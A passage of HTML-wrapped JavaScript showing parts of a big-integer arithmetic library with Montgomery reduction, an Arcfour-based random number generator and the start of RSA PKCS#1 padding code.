&nbsp;&nbsp;&nbsp;var c = x.am(i,x[i],r,2*i,0,1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if((r[i+x.t]+=x.am(i+1,2*x[i],r,2*i+1,c,x.t-i-1)) &gt;= x.DV) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r[i+x.t] -= x.DV;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r[i+x.t+1] = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(r.t &gt; 0) r[r.t-1] += x.am(i,x[i],r,2*i,0,1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) divide this by m, quotient and remainder to q, r (HAC 14.20)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// r != q, this != m. &nbsp;q or r may be null.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpDivRemTo(m,q,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var pm = m.abs();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(pm.t &lt;= 0) return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var pt = this.abs();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(pt.t &lt; pm.t) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(q != null) q.fromInt(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(r != null) this.copyTo(r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(r == null) r = nbi();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var y = nbi(), ts = this.s, ms = m.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var nsh = this.DB-nbits(pm[pm.t-1]); &nbsp;&nbsp;&nbsp;// normalize modulus</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(nsh &gt; 0) { pm.lShiftTo(nsh,y); pt.lShiftTo(nsh,r); }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else { pm.copyTo(y); pt.copyTo(r); }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var ys = y.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var y0 = y[ys-1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(y0 == 0) return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var yt = y0*(1&lt;&lt;this.F1)+((ys&gt;1)?y[ys-2]&gt;&gt;this.F2:0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var d1 = this.FV/yt, d2 = (1&lt;&lt;this.F1)/yt, e = 1&lt;&lt;this.F2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = r.t, j = i-ys, t = (q==null)?nbi():q;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;y.dlShiftTo(j,t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(r.compareTo(t) &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r[r.t++] = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.subTo(t,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;BigInteger.ONE.dlShiftTo(ys,t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;t.subTo(y,y); &nbsp;&nbsp;&nbsp;// &quot;negative&quot; y so we can replace sub with am later</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(y.t &lt; ys) y[y.t++] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--j &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Estimate quotient digit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var qd = (r[--i]==y0)?this.DM:Math.floor(r[i]*d1+(r[i-1]+e)*d2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if((r[i]+=y.am(0,qd,r,j,0,ys)) &lt; qd) { &nbsp;&nbsp;&nbsp;// Try it out</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;y.dlShiftTo(j,t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r.subTo(t,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(r[i] &lt; --qd) r.subTo(t,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(q != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.drShiftTo(ys,q);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(ts != ms) BigInteger.ZERO.subTo(q,q);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = ys;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(nsh &gt; 0) r.rShiftTo(nsh,r); &nbsp;&nbsp;&nbsp;// Denormalize remainder</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(ts &lt; 0) BigInteger.ZERO.subTo(r,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (public) this mod a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnMod(a) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var r = nbi();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.abs().divRemTo(a,null,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(this.s &lt; 0 &amp;&amp; r.compareTo(BigInteger.ZERO) &gt; 0) a.subTo(r,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Modular reduction using &quot;classic&quot; algorithm</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function Classic(m) { this.m = m; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function cConvert(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(x.s &lt; 0 || x.compareTo(this.m) &gt;= 0) return x.mod(this.m);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else return x;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function cRevert(x) { return x; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function cReduce(x) { x.divRemTo(this.m,null,x); }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function cMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function cSqrTo(x,r) { x.squareTo(r); this.reduce(r); }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) return &quot;-1/this % 2^DB&quot;; useful for Mont. reduction</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// justification:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xy == 1 (mod m)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xy = &nbsp;1+km</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// &nbsp;&nbsp;xy(2-xy) = (1+km)(1-km)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// x[y(2-xy)] = 1-k^2m^2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// x[y(2-xy)] == 1 (mod m^2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// if y is 1/x mod m, then y(2-xy) is 1/x mod m^2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// should reduce x and y(2-xy) by m^2 at each step to keep size bounded.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// JS multiply &quot;overflows&quot; differently from C/C++, so care is needed here.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpInvDigit() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(this.t &lt; 1) return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var x = this[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if((x&amp;1) == 0) return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var y = x&amp;3; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// y == 1/x mod 2^2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;y = (y*(2-(x&amp;0xf)*y))&amp;0xf; &nbsp;&nbsp;&nbsp;// y == 1/x mod 2^4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;y = (y*(2-(x&amp;0xff)*y))&amp;0xff; &nbsp;&nbsp;&nbsp;// y == 1/x mod 2^8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;y = (y*(2-(((x&amp;0xffff)*y)&amp;0xffff)))&amp;0xffff; &nbsp;&nbsp;&nbsp;// y == 1/x mod 2^16</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// last step - calculate inverse mod DV directly;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// assumes 16 &lt; DB &lt;= 32 and assumes ability to handle 48-bit ints</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;y = (y*(2-x*y%this.DV))%this.DV; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// y == 1/x mod 2^dbits</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// we really want the negative inverse, and -DV &lt; y &lt; DV</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return (y&gt;0)?this.DV-y:-y;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Montgomery reduction</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function Montgomery(m) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.m = m;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.mp = m.invDigit();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.mpl = this.mp&amp;0x7fff;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.mph = this.mp&gt;&gt;15;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.um = (1&lt;&lt;(m.DB-15))-1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.mt2 = 2*m.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// xR mod m</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function montConvert(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var r = nbi();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;x.abs().dlShiftTo(this.m.t,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.divRemTo(this.m,null,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(x.s &lt; 0 &amp;&amp; r.compareTo(BigInteger.ZERO) &gt; 0) this.m.subTo(r,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// x/R mod m</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function montRevert(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var r = nbi();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;x.copyTo(r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.reduce(r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// x = x/R mod m (HAC 14.32)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function montReduce(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(x.t &lt;= this.mt2) &nbsp;&nbsp;&nbsp;// pad x so am has enough room later</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;x[x.t++] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(var i = 0; i &lt; this.m.t; ++i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// faster way of calculating u0 = x[i]*mp mod DV</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var j = x[i]&amp;0x7fff;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var u0 = (j*this.mpl+(((j*this.mph+(x[i]&gt;&gt;15)*this.mpl)&amp;this.um)&lt;&lt;15))&amp;x.DM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// use am to combine the multiply-shift-add into one call</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;j = i+this.m.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;x[j] += this.m.am(0,u0,x,i,0,this.m.t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// propagate carry</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(x[j] &gt;= x.DV) { x[j] -= x.DV; x[++j]++; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;x.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;x.drShiftTo(this.m.t,x);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(x.compareTo(this.m) &gt;= 0) x.subTo(this.m,x);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// r = &quot;x^2/R mod m&quot;; x != r</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function montSqrTo(x,r) { x.squareTo(r); this.reduce(r); }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// r = &quot;xy/R mod m&quot;; x,y != r</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function montMulTo(x,y,r) { x.multiplyTo(y,r); this.reduce(r); }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) true iff this is even</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpIsEven() { return ((this.t&gt;0)?(this[0]&amp;1):this.s) == 0; }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) this^e, e &lt; 2^32, doing sqr and mul with &quot;r&quot; (HAC 14.79)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpExp(e,z) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(e &gt; 0xffffffff || e &lt; 1) return BigInteger.ONE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var r = nbi(), r2 = nbi(), g = z.convert(this), i = nbits(e)-1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;g.copyTo(r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--i &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;z.sqrTo(r,r2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if((e&amp;(1&lt;&lt;i)) &gt; 0) z.mulTo(r2,g,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else { var t = r; r = r2; r2 = t; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return z.revert(r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (public) this^e % m, 0 &lt;= e &lt; 2^32</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnModPowInt(e,m) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var z;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(e &lt; 256 || m.isEven()) z = new Classic(m); else z = new Montgomery(m);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return this.exp(e,z);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// prng4.js - uses Arcfour as a PRNG</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function Arcfour() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.i = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.j = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.S = new Array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Initialize arcfour context from key, an array of ints, each from [0..255]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function ARC4init(key) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i, j, t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = 0; i &lt; 256; ++i)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.S[i] = i;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;j = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = 0; i &lt; 256; ++i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;j = (j + this.S[i] + key[i % key.length]) &amp; 255;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;t = this.S[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.S[i] = this.S[j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.S[j] = t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.i = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.j = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function ARC4next() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.i = (this.i + 1) &amp; 255;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.j = (this.j + this.S[this.i]) &amp; 255;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;t = this.S[this.i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.S[this.i] = this.S[this.j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.S[this.j] = t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return this.S[(t + this.S[this.i]) &amp; 255];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Plug in your RNG constructor here</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function prng_newstate() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return new Arcfour();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Mix in a 32-bit integer into the pool</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function rng_seed_int(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;rng_pool[rng_pptr++] ^= x &amp; 255;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;rng_pool[rng_pptr++] ^= (x &gt;&gt; 8) &amp; 255;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;rng_pool[rng_pptr++] ^= (x &gt;&gt; 16) &amp; 255;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;rng_pool[rng_pptr++] ^= (x &gt;&gt; 24) &amp; 255;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(rng_pptr &gt;= rng_psize) rng_pptr -= rng_psize;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Mix in the current time (w/milliseconds) into the pool</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function rng_seed_time() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;rng_seed_int(new Date().getTime());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function rng_get_byte() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(rng_state == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rng_seed_time();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rng_state = prng_newstate();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rng_state.init(rng_pool);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for(rng_pptr = 0; rng_pptr &lt; rng_pool.length; ++rng_pptr)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rng_pool[rng_pptr] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rng_pptr = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//rng_pool = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// TODO: allow reseeding after first request</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return rng_state.next();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function rng_get_bytes(ba) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = 0; i &lt; ba.length; ++i) ba[i] = rng_get_byte();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function SecureRandom() {}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Depends on jsbn.js and rng.js</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Version 1.1: support utf-8 encoding in pkcs1pad2</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// convert a (hex) string to a bignum object</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function parseBigInt(str,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return new BigInteger(str,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function linebrk(s,n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var ret = &quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(i + n &lt; s.length) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ret += s.substring(i,i+n) + &quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;i += n;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return ret + s.substring(i,s.length);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function byte2Hex(b) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(b &lt; 0x10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return &quot;0&quot; + b.toString(16);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return b.toString(16);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// PKCS#1 (type 2, random) pad input string s to n bytes, and return a bigint</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function pkcs1pad2(s,n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(n &lt; s.length + 11) { // TODO: fix for utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;alert(&quot;Message too long for RSA&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var ba = new Array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = s.length - 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(i &gt;= 0 &amp;&amp; n &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var c = s.charCodeAt(i--);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(c &lt; 128) { // encode using utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[--n] = c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else if((c &gt; 127) &amp;&amp; (c &lt; 2048)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[--n] = (c &amp; 63) | 128;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[--n] = (c &gt;&gt; 6) | 192;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[--n] = (c &amp; 63) | 128;</span><span class="cs8926E06"><br/></span><span 